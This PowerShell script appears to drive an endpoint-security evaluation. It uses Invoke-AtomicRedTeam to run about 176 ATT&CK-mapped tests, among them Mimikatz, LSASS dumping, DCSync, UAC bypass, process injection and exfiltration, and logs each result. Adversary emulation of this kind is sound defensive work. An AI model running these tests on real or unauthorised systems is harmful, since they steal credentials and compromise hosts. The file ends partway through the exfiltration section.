# ============================================================
# SentinelOne POC — ART Runner using Invoke-AtomicRedTeam
# Run as Administrator on isolated test endpoint
# ============================================================

#region SETUP
Set-ExecutionPolicy Bypass -Scope Process -Force

# Install modules if missing
if (-not (Get-Module -ListAvailable -Name invoke-atomicredteam)) {
    Install-Module -Name invoke-atomicredteam -Scope CurrentUser -Force
}
if (-not (Get-Module -ListAvailable -Name powershell-yaml)) {
    Install-Module -Name powershell-yaml -Scope CurrentUser -Force
}

Import-Module invoke-atomicredteam

# Install atomics if missing
$AtomicsPath = "$env:USERPROFILE\AtomicRedTeam\atomics"
if (-not (Test-Path $AtomicsPath)) {
    Install-AtomicRedTeam -getAtomics -InstallPath "$env:USERPROFILE\AtomicRedTeam"
}

# Set atomics path
$PSDefaultParameterValues = @{
    "Invoke-AtomicTest:PathToAtomicsFolder" = $AtomicsPath
}

# Log setup
$LogDir  = "C:\s1_eval"
$LogFile = "$LogDir\art_results.csv"
New-Item -ItemType Directory -Force -Path $LogDir | Out-Null
"Time,TestID,Technique,TestNum,TestName,Status,DurationSec" |
    Out-File -FilePath $LogFile -Encoding UTF8

#endregion

#region HELPER
function Invoke-S1Test {
    param(
        [string]$TestID,
        [string]$Technique,
        [int]$TestNumber,
        [string]$TestName,
        [int]$WaitSec = 30
    )

    Write-Host ""
    Write-Host "[$TestID] $Technique #$TestNumber — $TestName" -ForegroundColor Cyan

    # Get prereqs silently
    Invoke-AtomicTest $Technique -TestNumbers $TestNumber -GetPrereqs -ErrorAction SilentlyContinue | Out-Null

    $start = Get-Date
    $status = "Executed"
    try {
        Invoke-AtomicTest $Technique -TestNumbers $TestNumber -TimeoutSeconds 120 -ErrorAction Stop
    } catch {
        $status = "Error"
        Write-Host "  Error: $($_.Exception.Message)" -ForegroundColor Red
    }
    $dur = [math]::Round(((Get-Date) - $start).TotalSeconds, 1)

    # Log result
    "$((Get-Date).ToString('yyyy-MM-dd HH:mm:ss')),$TestID,$Technique,$TestNumber,`"$TestName`",$status,$dur" |
        Add-Content -Path $LogFile

    Write-Host "  Completed in ${dur}s — check S1 console now" -ForegroundColor Green
    Write-Host "  Waiting ${WaitSec}s..." -ForegroundColor Gray
    Start-Sleep -Seconds $WaitSec

    # Cleanup
    Invoke-AtomicTest $Technique -TestNumbers $TestNumber -Cleanup -ErrorAction SilentlyContinue | Out-Null
}
#endregion


#region INITIAL-ACCESS
Write-Host "" 
Write-Host "=======================================================" -ForegroundColor Magenta
Write-Host " TACTIC: INITIAL-ACCESS (5 tests)" -ForegroundColor Magenta
Write-Host "=======================================================" -ForegroundColor Magenta

# T1566.002
Invoke-S1Test -TestID "W-001" -Technique "T1566.002" -TestNumber 1 -TestName "Paste and run technique" -WaitSec 30
# T1566.001
Invoke-S1Test -TestID "W-002" -Technique "T1566.001" -TestNumber 1 -TestName "Download Macro-Enabled Phishing Attachment" -WaitSec 30
Invoke-S1Test -TestID "W-003" -Technique "T1566.001" -TestNumber 2 -TestName "Word spawned a command shell and used an IP address in the c" -WaitSec 30
# T1078.003
Invoke-S1Test -TestID "W-004" -Technique "T1078.003" -TestNumber 1 -TestName "Create local account with admin privileges" -WaitSec 30
Invoke-S1Test -TestID "W-005" -Technique "T1078.003" -TestNumber 13 -TestName "Use PsExec to elevate to NT Authority\SYSTEM account" -WaitSec 30
#endregion

#region EXECUTION
Write-Host "" 
Write-Host "=======================================================" -ForegroundColor Magenta
Write-Host " TACTIC: EXECUTION (31 tests)" -ForegroundColor Magenta
Write-Host "=======================================================" -ForegroundColor Magenta

# T1053.005
Invoke-S1Test -TestID "W-006" -Technique "T1053.005" -TestNumber 1 -TestName "Scheduled Task Startup Script" -WaitSec 30
Invoke-S1Test -TestID "W-007" -Technique "T1053.005" -TestNumber 2 -TestName "Scheduled task Local" -WaitSec 30
Invoke-S1Test -TestID "W-008" -Technique "T1053.005" -TestNumber 4 -TestName "Powershell Cmdlet Scheduled Task" -WaitSec 30
Invoke-S1Test -TestID "W-009" -Technique "T1053.005" -TestNumber 5 -TestName "Task Scheduler via VBA" -WaitSec 30
# T1047
Invoke-S1Test -TestID "W-010" -Technique "T1047" -TestNumber 1 -TestName "WMI Reconnaissance Users" -WaitSec 30
Invoke-S1Test -TestID "W-011" -Technique "T1047" -TestNumber 2 -TestName "WMI Reconnaissance Processes" -WaitSec 30
Invoke-S1Test -TestID "W-012" -Technique "T1047" -TestNumber 3 -TestName "WMI Reconnaissance Software" -WaitSec 30
# T1574.011
Invoke-S1Test -TestID "W-013" -Technique "T1574.011" -TestNumber 1 -TestName "Service Registry Permissions Weakness" -WaitSec 30
Invoke-S1Test -TestID "W-014" -Technique "T1574.011" -TestNumber 2 -TestName "Service ImagePath Change with reg.exe" -WaitSec 30
# T1204.002
Invoke-S1Test -TestID "W-015" -Technique "T1204.002" -TestNumber 1 -TestName "OSTap Style Macro Execution" -WaitSec 30
Invoke-S1Test -TestID "W-016" -Technique "T1204.002" -TestNumber 2 -TestName "OSTap Payload Download" -WaitSec 30
# T1574.001
Invoke-S1Test -TestID "W-017" -Technique "T1574.001" -TestNumber 1 -TestName "DLL Search Order Hijacking - amsi.dll" -WaitSec 30
Invoke-S1Test -TestID "W-018" -Technique "T1574.001" -TestNumber 2 -TestName "Phantom Dll Hijacking - WinAppXRT.dll" -WaitSec 30
Invoke-S1Test -TestID "W-019" -Technique "T1574.001" -TestNumber 4 -TestName "DLL Side-Loading using the Notepad++ GUP.exe binary" -WaitSec 30
# T1059.001
Invoke-S1Test -TestID "W-020" -Technique "T1059.001" -TestNumber 1 -TestName "Mimikatz" -WaitSec 30
Invoke-S1Test -TestID "W-021" -Technique "T1059.001" -TestNumber 2 -TestName "Run BloodHound from local disk" -WaitSec 30
Invoke-S1Test -TestID "W-022" -Technique "T1059.001" -TestNumber 4 -TestName "Mimikatz - Cradlecraft PsSendKeys" -WaitSec 30
Invoke-S1Test -TestID "W-023" -Technique "T1059.001" -TestNumber 12 -TestName "PowerShell Session Creation and Use" -WaitSec 30
Invoke-S1Test -TestID "W-024" -Technique "T1059.001" -TestNumber 13 -TestName "ATHPowerShellCommandLineParameter -Command parameter variati" -WaitSec 30
Invoke-S1Test -TestID "W-025" -Technique "T1059.001" -TestNumber 14 -TestName "ATHPowerShellCommandLineParameter -Command parameter variati" -WaitSec 30
Invoke-S1Test -TestID "W-026" -Technique "T1059.001" -TestNumber 17 -TestName "PowerShell Command Execution" -WaitSec 30
Invoke-S1Test -TestID "W-027" -Technique "T1059.001" -TestNumber 18 -TestName "PowerShell Invoke Known Malicious Cmdlets" -WaitSec 30
Invoke-S1Test -TestID "W-028" -Technique "T1059.001" -TestNumber 19 -TestName "PowerUp Invoke-AllChecks" -WaitSec 30
# T1197
Invoke-S1Test -TestID "W-029" -Technique "T1197" -TestNumber 1 -TestName "Bitsadmin Download (cmd)" -WaitSec 30
Invoke-S1Test -TestID "W-030" -Technique "T1197" -TestNumber 2 -TestName "Bitsadmin Download (PowerShell)" -WaitSec 30
Invoke-S1Test -TestID "W-031" -Technique "T1197" -TestNumber 3 -TestName "Persist, Download, and Execute" -WaitSec 30
# T1059.003
Invoke-S1Test -TestID "W-032" -Technique "T1059.003" -TestNumber 1 -TestName "Create and Execute Batch Script" -WaitSec 30
Invoke-S1Test -TestID "W-033" -Technique "T1059.003" -TestNumber 2 -TestName "Writes text to a file and displays it." -WaitSec 30
Invoke-S1Test -TestID "W-034" -Technique "T1059.003" -TestNumber 3 -TestName "Suspicious Execution via Windows Command Shell" -WaitSec 30
# T1059.005
Invoke-S1Test -TestID "W-035" -Technique "T1059.005" -TestNumber 1 -TestName "Visual Basic script execution to gather local computer infor" -WaitSec 30
Invoke-S1Test -TestID "W-036" -Technique "T1059.005" -TestNumber 2 -TestName "Encoded VBS code execution" -WaitSec 30
#endregion

#region PERSISTENCE
Write-Host "" 
Write-Host "=======================================================" -ForegroundColor Magenta
Write-Host " TACTIC: PERSISTENCE (17 tests)" -ForegroundColor Magenta
Write-Host "=======================================================" -ForegroundColor Magenta

# T1543.003
Invoke-S1Test -TestID "W-037" -Technique "T1543.003" -TestNumber 1 -TestName "Modify Fax service to run PowerShell" -WaitSec 30
Invoke-S1Test -TestID "W-038" -Technique "T1543.003" -TestNumber 2 -TestName "Service Installation CMD" -WaitSec 30
Invoke-S1Test -TestID "W-039" -Technique "T1543.003" -TestNumber 4 -TestName "TinyTurla backdoor service w64time" -WaitSec 30
# T1547.005
Invoke-S1Test -TestID "W-040" -Technique "T1547.005" -TestNumber 1 -TestName "Modify HKLM:\System\CurrentControlSet\Control\Lsa Security S" -WaitSec 30
# T1112
Invoke-S1Test -TestID "W-041" -Technique "T1112" -TestNumber 1 -TestName "Modify Registry of Current User Profile - cmd" -WaitSec 30
Invoke-S1Test -TestID "W-042" -Technique "T1112" -TestNumber 2 -TestName "Modify Registry of Local Machine - cmd" -WaitSec 30
Invoke-S1Test -TestID "W-043" -Technique "T1112" -TestNumber 3 -TestName "Modify registry to store logon credentials" -WaitSec 30
# T1547.004
Invoke-S1Test -TestID "W-044" -Technique "T1547.004" -TestNumber 1 -TestName "Winlogon Shell Key Persistence - PowerShell" -WaitSec 30
Invoke-S1Test -TestID "W-045" -Technique "T1547.004" -TestNumber 2 -TestName "Winlogon Userinit Key Persistence - PowerShell" -WaitSec 30
# T1546.003
Invoke-S1Test -TestID "W-046" -Technique "T1546.003" -TestNumber 1 -TestName "Persistence via WMI Event Subscription - CommandLineEventCon" -WaitSec 30
# T1547.001
Invoke-S1Test -TestID "W-047" -Technique "T1547.001" -TestNumber 1 -TestName "Reg Key Run" -WaitSec 30
Invoke-S1Test -TestID "W-048" -Technique "T1547.001" -TestNumber 2 -TestName "Reg Key RunOnce" -WaitSec 30
Invoke-S1Test -TestID "W-049" -Technique "T1547.001" -TestNumber 5 -TestName "Suspicious jse file run from startup Folder" -WaitSec 30
# T1098
Invoke-S1Test -TestID "W-050" -Technique "T1098" -TestNumber 1 -TestName "Admin Account Manipulate" -WaitSec 30
Invoke-S1Test -TestID "W-051" -Technique "T1098" -TestNumber 2 -TestName "Domain Account and Group Manipulate" -WaitSec 30
# T1546.015
Invoke-S1Test -TestID "W-052" -Technique "T1546.015" -TestNumber 1 -TestName "COM Hijacking - InprocServer32" -WaitSec 30
# T1546.007
Invoke-S1Test -TestID "W-053" -Technique "T1546.007" -TestNumber 1 -TestName "Netsh Helper DLL Registration" -WaitSec 30
#endregion

#region PRIVILEGE-ESCALATION
Write-Host "" 
Write-Host "=======================================================" -ForegroundColor Magenta
Write-Host " TACTIC: PRIVILEGE-ESCALATION (17 tests)" -ForegroundColor Magenta
Write-Host "=======================================================" -ForegroundColor Magenta

# T1055.011
Invoke-S1Test -TestID "W-054" -Technique "T1055.011" -TestNumber 1 -TestName "Process Injection via Extra Window Memory (EWM) x64 executab" -WaitSec 45
# T1548.002
Invoke-S1Test -TestID "W-055" -Technique "T1548.002" -TestNumber 1 -TestName "Bypass UAC using Event Viewer (cmd)" -WaitSec 30
Invoke-S1Test -TestID "W-056" -Technique "T1548.002" -TestNumber 2 -TestName "Bypass UAC using Event Viewer (PowerShell)" -WaitSec 30
Invoke-S1Test -TestID "W-057" -Technique "T1548.002" -TestNumber 3 -TestName "Bypass UAC using Fodhelper" -WaitSec 30
Invoke-S1Test -TestID "W-058" -Technique "T1548.002" -TestNumber 4 -TestName "Bypass UAC using Fodhelper - PowerShell" -WaitSec 30
# T1055.003
Invoke-S1Test -TestID "W-059" -Technique "T1055.003" -TestNumber 1 -TestName "Thread Execution Hijacking" -WaitSec 45
# T1055
Invoke-S1Test -TestID "W-060" -Technique "T1055" -TestNumber 1 -TestName "Shellcode execution via VBA" -WaitSec 45
Invoke-S1Test -TestID "W-061" -Technique "T1055" -TestNumber 2 -TestName "Remote Process Injection in LSASS via mimikatz" -WaitSec 45
Invoke-S1Test -TestID "W-062" -Technique "T1055" -TestNumber 4 -TestName "Dirty Vanity process Injection" -WaitSec 45
# T1134.002
Invoke-S1Test -TestID "W-063" -Technique "T1134.002" -TestNumber 1 -TestName "Access Token Manipulation" -WaitSec 30
# T1055.002
Invoke-S1Test -TestID "W-064" -Technique "T1055.002" -TestNumber 1 -TestName "Portable Executable Injection" -WaitSec 45
# T1134.001
Invoke-S1Test -TestID "W-065" -Technique "T1134.001" -TestNumber 1 -TestName "Named pipe client impersonation" -WaitSec 30
# T1055.012
Invoke-S1Test -TestID "W-066" -Technique "T1055.012" -TestNumber 1 -TestName "Process Hollowing using PowerShell" -WaitSec 45
Invoke-S1Test -TestID "W-067" -Technique "T1055.012" -TestNumber 2 -TestName "RunPE via VBA" -WaitSec 45
Invoke-S1Test -TestID "W-068" -Technique "T1055.012" -TestNumber 3 -TestName "Process Hollowing in Go using CreateProcessW WinAPI" -WaitSec 45
Invoke-S1Test -TestID "W-069" -Technique "T1055.012" -TestNumber 4 -TestName "Process Hollowing in Go using CreateProcessW and CreatePipe " -WaitSec 45
# T1055.001
Invoke-S1Test -TestID "W-070" -Technique "T1055.001" -TestNumber 1 -TestName "Process Injection via mavinject.exe" -WaitSec 45
#endregion

#region STEALTH
Write-Host "" 
Write-Host "=======================================================" -ForegroundColor Magenta
Write-Host " TACTIC: STEALTH (41 tests)" -ForegroundColor Magenta
Write-Host "=======================================================" -ForegroundColor Magenta

# T1218.011
Invoke-S1Test -TestID "W-071" -Technique "T1218.011" -TestNumber 1 -TestName "Rundll32 execute JavaScript Remote Payload With GetObject" -WaitSec 30
Invoke-S1Test -TestID "W-072" -Technique "T1218.011" -TestNumber 2 -TestName "Rundll32 execute VBscript command" -WaitSec 30
Invoke-S1Test -TestID "W-073" -Technique "T1218.011" -TestNumber 4 -TestName "Rundll32 advpack.dll Execution" -WaitSec 30
Invoke-S1Test -TestID "W-074" -Technique "T1218.011" -TestNumber 8 -TestName "Execution of HTA and VBS Files using Rundll32 and URL.dll" -WaitSec 30
Invoke-S1Test -TestID "W-075" -Technique "T1218.011" -TestNumber 9 -TestName "Launches an executable using Rundll32 and pcwutl.dll" -WaitSec 30
Invoke-S1Test -TestID "W-076" -Technique "T1218.011" -TestNumber 10 -TestName "Execution of non-dll using rundll32.exe" -WaitSec 30
Invoke-S1Test -TestID "W-077" -Technique "T1218.011" -TestNumber 12 -TestName "Rundll32 with Control_RunDLL" -WaitSec 30
# T1216.001
Invoke-S1Test -TestID "W-078" -Technique "T1216.001" -TestNumber 1 -TestName "PubPrn.vbs Signed Script Bypass" -WaitSec 30
# T1006
Invoke-S1Test -TestID "W-079" -Technique "T1006" -TestNumber 1 -TestName "Read volume boot sector via DOS device path (PowerShell)" -WaitSec 30
# T1036.007
Invoke-S1Test -TestID "W-080" -Technique "T1036.007" -TestNumber 1 -TestName "File Extension Masquerading" -WaitSec 30
# T1036.005
Invoke-S1Test -TestID "W-081" -Technique "T1036.005" -TestNumber 2 -TestName "Masquerade as a built-in system executable" -WaitSec 30
Invoke-S1Test -TestID "W-082" -Technique "T1036.005" -TestNumber 3 -TestName "Masquerading cmd.exe as VEDetector.exe" -WaitSec 30
# T1564
Invoke-S1Test -TestID "W-083" -Technique "T1564" -TestNumber 2 -TestName "Create a Hidden User Called $" -WaitSec 30
Invoke-S1Test -TestID "W-084" -Technique "T1564" -TestNumber 3 -TestName "Create an Administrator  user (with a space on the end)" -WaitSec 30
Invoke-S1Test -TestID "W-085" -Technique "T1564" -TestNumber 4 -TestName "Create and Hide a Service with sc.exe" -WaitSec 30
# T1497.001
Invoke-S1Test -TestID "W-086" -Technique "T1497.001" -TestNumber 3 -TestName "Detect Virtualization Environment (Windows)" -WaitSec 30
Invoke-S1Test -TestID "W-087" -Technique "T1497.001" -TestNumber 5 -TestName "Detect Virtualization Environment via WMI Manufacturer/Model" -WaitSec 30
# T1218.004
Invoke-S1Test -TestID "W-088" -Technique "T1218.004" -TestNumber 1 -TestName "CheckIfInstallable method call" -WaitSec 30
Invoke-S1Test -TestID "W-089" -Technique "T1218.004" -TestNumber 4 -TestName "InstallUtil Install method call" -WaitSec 30
Invoke-S1Test -TestID "W-090" -Technique "T1218.004" -TestNumber 6 -TestName "InstallUtil Uninstall method call - /installtype=notransacti" -WaitSec 30
Invoke-S1Test -TestID "W-091" -Technique "T1218.004" -TestNumber 8 -TestName "InstallUtil evasive invocation" -WaitSec 30
# T1218.007
Invoke-S1Test -TestID "W-092" -Technique "T1218.007" -TestNumber 1 -TestName "Msiexec.exe - Execute Local MSI file with embedded JScript" -WaitSec 30
Invoke-S1Test -TestID "W-093" -Technique "T1218.007" -TestNumber 3 -TestName "Msiexec.exe - Execute Local MSI file with an embedded DLL" -WaitSec 30
Invoke-S1Test -TestID "W-094" -Technique "T1218.007" -TestNumber 4 -TestName "Msiexec.exe - Execute Local MSI file with an embedded EXE" -WaitSec 30
Invoke-S1Test -TestID "W-095" -Technique "T1218.007" -TestNumber 11 -TestName "Msiexec.exe - Execute Remote MSI file" -WaitSec 30
# T1070.003
Invoke-S1Test -TestID "W-096" -Technique "T1070.003" -TestNumber 11 -TestName "Prevent Powershell History Logging" -WaitSec 30
Invoke-S1Test -TestID "W-097" -Technique "T1070.003" -TestNumber 12 -TestName "Clear Powershell History by Deleting History File" -WaitSec 30
Invoke-S1Test -TestID "W-098" -Technique "T1070.003" -TestNumber 14 -TestName "Clear PowerShell Session History" -WaitSec 30
# T1202
Invoke-S1Test -TestID "W-099" -Technique "T1202" -TestNumber 1 -TestName "Indirect Command Execution - pcalua.exe" -WaitSec 30
Invoke-S1Test -TestID "W-100" -Technique "T1202" -TestNumber 2 -TestName "Indirect Command Execution - forfiles.exe" -WaitSec 30
Invoke-S1Test -TestID "W-101" -Technique "T1202" -TestNumber 3 -TestName "Indirect Command Execution - conhost.exe" -WaitSec 30
# T1140
Invoke-S1Test -TestID "W-102" -Technique "T1140" -TestNumber 1 -TestName "Deobfuscate/Decode Files Or Information" -WaitSec 30
Invoke-S1Test -TestID "W-103" -Technique "T1140" -TestNumber 2 -TestName "Certutil Rename and Decode" -WaitSec 30
# T1218.003
Invoke-S1Test -TestID "W-104" -Technique "T1218.003" -TestNumber 1 -TestName "CMSTP Executing Remote Scriptlet" -WaitSec 30
# T1218.005
Invoke-S1Test -TestID "W-105" -Technique "T1218.005" -TestNumber 1 -TestName "Mshta executes JavaScript Scheme Fetch Remote Payload With G" -WaitSec 30
Invoke-S1Test -TestID "W-106" -Technique "T1218.005" -TestNumber 2 -TestName "Mshta executes VBScript to execute malicious command" -WaitSec 30
Invoke-S1Test -TestID "W-107" -Technique "T1218.005" -TestNumber 3 -TestName "Mshta Executes Remote HTML Application (HTA)" -WaitSec 30
# T1027
Invoke-S1Test -TestID "W-108" -Technique "T1027" -TestNumber 2 -TestName "Execute base64-encoded PowerShell" -WaitSec 30
Invoke-S1Test -TestID "W-109" -Technique "T1027" -TestNumber 5 -TestName "DLP Evasion via Sensitive Data in VBA Macro over email" -WaitSec 30
# T1218.010
Invoke-S1Test -TestID "W-110" -Technique "T1218.010" -TestNumber 1 -TestName "Regsvr32 local COM scriptlet execution" -WaitSec 30
Invoke-S1Test -TestID "W-111" -Technique "T1218.010" -TestNumber 2 -TestName "Regsvr32 remote COM scriptlet execution" -WaitSec 30
#endregion

#region CREDENTIAL-ACCESS
Write-Host "" 
Write-Host "=======================================================" -ForegroundColor Magenta
Write-Host " TACTIC: CREDENTIAL-ACCESS (20 tests)" -ForegroundColor Magenta
Write-Host "=======================================================" -ForegroundColor Magenta

# T1056.001
Invoke-S1Test -TestID "W-112" -Technique "T1056.001" -TestNumber 1 -TestName "Input Capture" -WaitSec 30
# T1110.001
Invoke-S1Test -TestID "W-113" -Technique "T1110.001" -TestNumber 1 -TestName "Brute Force Credentials of single Active Directory domain us" -WaitSec 30
Invoke-S1Test -TestID "W-114" -Technique "T1110.001" -TestNumber 2 -TestName "Brute Force Credentials of single Active Directory domain us" -WaitSec 30
# T1003.002
Invoke-S1Test -TestID "W-115" -Technique "T1003.002" -TestNumber 1 -TestName "Registry dump of SAM, creds, and secrets" -WaitSec 45
Invoke-S1Test -TestID "W-116" -Technique "T1003.002" -TestNumber 2 -TestName "Registry parse with pypykatz" -WaitSec 45
# T1003.004
Invoke-S1Test -TestID "W-117" -Technique "T1003.004" -TestNumber 1 -TestName "Dumping LSA Secrets" -WaitSec 45
# T1558.004
Invoke-S1Test -TestID "W-118" -Technique "T1558.004" -TestNumber 1 -TestName "Rubeus asreproast" -WaitSec 45
# T1555.003
Invoke-S1Test -TestID "W-119" -Technique "T1555.003" -TestNumber 1 -TestName "Run Chrome-password Collector" -WaitSec 30
# T1003.001
Invoke-S1Test -TestID "W-120" -Technique "T1003.001" -TestNumber 1 -TestName "Dump LSASS.exe Memory using ProcDump" -WaitSec 45
Invoke-S1Test -TestID "W-121" -Technique "T1003.001" -TestNumber 3 -TestName "Dump LSASS.exe Memory using direct system calls and API unho" -WaitSec 45
Invoke-S1Test -TestID "W-122" -Technique "T1003.001" -TestNumber 7 -TestName "LSASS read with pypykatz" -WaitSec 45
Invoke-S1Test -TestID "W-123" -Technique "T1003.001" -TestNumber 9 -TestName "Create Mini Dump of LSASS.exe using ProcDump" -WaitSec 45
# T1110.003
Invoke-S1Test -TestID "W-124" -Technique "T1110.003" -TestNumber 1 -TestName "Password Spray all Domain Users" -WaitSec 30
Invoke-S1Test -TestID "W-125" -Technique "T1110.003" -TestNumber 2 -TestName "Password Spray (DomainPasswordSpray)" -WaitSec 30
# T1003.003
Invoke-S1Test -TestID "W-126" -Technique "T1003.003" -TestNumber 1 -TestName "Create Volume Shadow Copy with vssadmin" -WaitSec 45
Invoke-S1Test -TestID "W-127" -Technique "T1003.003" -TestNumber 2 -TestName "Copy NTDS.dit from Volume Shadow Copy" -WaitSec 45
Invoke-S1Test -TestID "W-128" -Technique "T1003.003" -TestNumber 3 -TestName "Dump Active Directory Database with NTDSUtil" -WaitSec 45
# T1558.003
Invoke-S1Test -TestID "W-129" -Technique "T1558.003" -TestNumber 1 -TestName "Request for service tickets" -WaitSec 45
Invoke-S1Test -TestID "W-130" -Technique "T1558.003" -TestNumber 2 -TestName "Rubeus kerberoast" -WaitSec 45
# T1003.006
Invoke-S1Test -TestID "W-131" -Technique "T1003.006" -TestNumber 1 -TestName "DCSync (Active Directory)" -WaitSec 45
#endregion

#region DISCOVERY
Write-Host "" 
Write-Host "=======================================================" -ForegroundColor Magenta
Write-Host " TACTIC: DISCOVERY (19 tests)" -ForegroundColor Magenta
Write-Host "=======================================================" -ForegroundColor Magenta

# T1033
Invoke-S1Test -TestID "W-132" -Technique "T1033" -TestNumber 1 -TestName "System Owner/User Discovery" -WaitSec 30
Invoke-S1Test -TestID "W-133" -Technique "T1033" -TestNumber 4 -TestName "User Discovery With Env Vars PowerShell Script" -WaitSec 30
# T1087.002
Invoke-S1Test -TestID "W-134" -Technique "T1087.002" -TestNumber 1 -TestName "Enumerate all accounts (Domain)" -WaitSec 30
Invoke-S1Test -TestID "W-135" -Technique "T1087.002" -TestNumber 3 -TestName "Enumerate logged on users via CMD (Domain)" -WaitSec 30
# T1069.002
Invoke-S1Test -TestID "W-136" -Technique "T1069.002" -TestNumber 1 -TestName "Basic Permission Groups Discovery Windows (Domain)" -WaitSec 30
Invoke-S1Test -TestID "W-137" -Technique "T1069.002" -TestNumber 2 -TestName "Permission Groups Discovery PowerShell (Domain)" -WaitSec 30
# T1007
Invoke-S1Test -TestID "W-138" -Technique "T1007" -TestNumber 1 -TestName "System Service Discovery" -WaitSec 30
# T1082
Invoke-S1Test -TestID "W-139" -Technique "T1082" -TestNumber 1 -TestName "System Information Discovery" -WaitSec 30
# T1016
Invoke-S1Test -TestID "W-140" -Technique "T1016" -TestNumber 1 -TestName "System Network Configuration Discovery on Windows" -WaitSec 30
Invoke-S1Test -TestID "W-141" -Technique "T1016" -TestNumber 2 -TestName "List Windows Firewall Rules" -WaitSec 30
# T1083
Invoke-S1Test -TestID "W-142" -Technique "T1083" -TestNumber 1 -TestName "File and Directory Discovery (cmd.exe)" -WaitSec 30
# T1049
Invoke-S1Test -TestID "W-143" -Technique "T1049" -TestNumber 1 -TestName "System Network Connections Discovery" -WaitSec 30
# T1057
Invoke-S1Test -TestID "W-144" -Technique "T1057" -TestNumber 2 -TestName "Process Discovery - tasklist" -WaitSec 30
# T1069.001
Invoke-S1Test -TestID "W-145" -Technique "T1069.001" -TestNumber 2 -TestName "Basic Permission Groups Discovery Windows (Local)" -WaitSec 30
# T1012
Invoke-S1Test -TestID "W-146" -Technique "T1012" -TestNumber 1 -TestName "Query Registry" -WaitSec 30
Invoke-S1Test -TestID "W-147" -Technique "T1012" -TestNumber 2 -TestName "Query Registry with Powershell cmdlets" -WaitSec 30
# T1018
Invoke-S1Test -TestID "W-148" -Technique "T1018" -TestNumber 1 -TestName "Remote System Discovery - net" -WaitSec 30
Invoke-S1Test -TestID "W-149" -Technique "T1018" -TestNumber 2 -TestName "Remote System Discovery - net group Domain Computers" -WaitSec 30
Invoke-S1Test -TestID "W-150" -Technique "T1018" -TestNumber 3 -TestName "Remote System Discovery - nltest" -WaitSec 30
#endregion

#region LATERAL-MOVEMENT
Write-Host "" 
Write-Host "=======================================================" -ForegroundColor Magenta
Write-Host " TACTIC: LATERAL-MOVEMENT (9 tests)" -ForegroundColor Magenta
Write-Host "=======================================================" -ForegroundColor Magenta

# T1021.002
Invoke-S1Test -TestID "W-151" -Technique "T1021.002" -TestNumber 1 -TestName "Map admin share" -WaitSec 30
Invoke-S1Test -TestID "W-152" -Technique "T1021.002" -TestNumber 2 -TestName "Map Admin Share PowerShell" -WaitSec 30
Invoke-S1Test -TestID "W-153" -Technique "T1021.002" -TestNumber 3 -TestName "Copy and Execute File with PsExec" -WaitSec 30
# T1021.006
Invoke-S1Test -TestID "W-154" -Technique "T1021.006" -TestNumber 1 -TestName "Enable Windows Remote Management" -WaitSec 30
Invoke-S1Test -TestID "W-155" -Technique "T1021.006" -TestNumber 2 -TestName "Remote Code Execution with PS Credentials Using Invoke-Comma" -WaitSec 30
# T1570
Invoke-S1Test -TestID "W-156" -Technique "T1570" -TestNumber 1 -TestName "Exfiltration Over SMB over QUIC (New-SmbMapping)" -WaitSec 30
# T1563.002
Invoke-S1Test -TestID "W-157" -Technique "T1563.002" -TestNumber 1 -TestName "RDP hijacking" -WaitSec 30
# T1550.002
Invoke-S1Test -TestID "W-158" -Technique "T1550.002" -TestNumber 1 -TestName "Mimikatz Pass the Hash" -WaitSec 45
# T1021.001
Invoke-S1Test -TestID "W-159" -Technique "T1021.001" -TestNumber 1 -TestName "RDP to DomainController" -WaitSec 30
#endregion

#region COMMAND-AND-CONTROL
Write-Host "" 
Write-Host "=======================================================" -ForegroundColor Magenta
Write-Host " TACTIC: COMMAND-AND-CONTROL (7 tests)" -ForegroundColor Magenta
Write-Host "=======================================================" -ForegroundColor Magenta

# T1132.001
Invoke-S1Test -TestID "W-160" -Technique "T1132.001" -TestNumber 3 -TestName "XOR Encoded data." -WaitSec 30
# T1071.004
Invoke-S1Test -TestID "W-161" -Technique "T1071.004" -TestNumber 1 -TestName "DNS Large Query Volume" -WaitSec 30
Invoke-S1Test -TestID "W-162" -Technique "T1071.004" -TestNumber 2 -TestName "DNS Regular Beaconing" -WaitSec 30
Invoke-S1Test -TestID "W-163" -Technique "T1071.004" -TestNumber 3 -TestName "DNS Long Domain Query" -WaitSec 30
# T1095
Invoke-S1Test -TestID "W-164" -Technique "T1095" -TestNumber 1 -TestName "ICMP C2" -WaitSec 30
# T1071.001
Invoke-S1Test -TestID "W-165" -Technique "T1071.001" -TestNumber 1 -TestName "Malicious User Agents - Powershell" -WaitSec 30
Invoke-S1Test -TestID "W-166" -Technique "T1071.001" -TestNumber 2 -TestName "Malicious User Agents - CMD" -WaitSec 30
#endregion

#region COLLECTION
Write-Host "" 
Write-Host "=======================================================" -ForegroundColor Magenta
Write-Host " TACTIC: COLLECTION (6 tests)" -ForegroundColor Magenta
Write-Host "=======================================================" -ForegroundColor Magenta

# T1560.001
Invoke-S1Test -TestID "W-167" -Technique "T1560.001" -TestNumber 1 -TestName "Compress Data for Exfiltration With Rar" -WaitSec 30
Invoke-S1Test -TestID "W-168" -Technique "T1560.001" -TestNumber 2 -TestName "Compress Data and lock with password for Exfiltration with w" -WaitSec 30
Invoke-S1Test -TestID "W-169" -Technique "T1560.001" -TestNumber 3 -TestName "Compress Data and lock with password for Exfiltration with w" -WaitSec 30
# T1114.001
Invoke-S1Test -TestID "W-170" -Technique "T1114.001" -TestNumber 1 -TestName "Email Collection with PowerShell Get-Inbox" -WaitSec 30
# T1005
Invoke-S1Test -TestID "W-171" -Technique "T1005" -TestNumber 1 -TestName "Search files of interest and save them to a single zip file " -WaitSec 30
# T1039
Invoke-S1Test -TestID "W-172" -Technique "T1039" -TestNumber 1 -TestName "Copy a sensitive File over Administrative share with copy" -WaitSec 30
#endregion

#region EXFILTRATION
Write-Host "" 
Write-Host "=======================================================" -ForegroundColor Magenta
Write-Host " TACTIC: EXFILTRATION (9 tests)" -ForegroundColor Magenta
Write-Host "=======================================================" -ForegroundColor Magenta

# T1020
Invoke-S1Test -TestID "W-173" -Technique "T1020" -TestNumber 1 -TestName "IcedID Botnet HTTP PUT" -WaitSec 30
Invoke-S1Test -TestID "W-174" -Technique "T1020" -TestNumber 2 -TestName "Exfiltration via Encrypted FTP" -WaitSec 30
# T1048.002
Invoke-S1Test -TestID "W-175" -Technique "T1048.002" -TestNumber 1 -TestName "Exfiltrate data HTTPS using curl windows" -WaitSec 30
# T1041
Invoke-S1Test -TestID "W-176" -Technique "T1041" -TestNumber 1 -TestName "C2 Data Exfiltration" -WaitSec 30
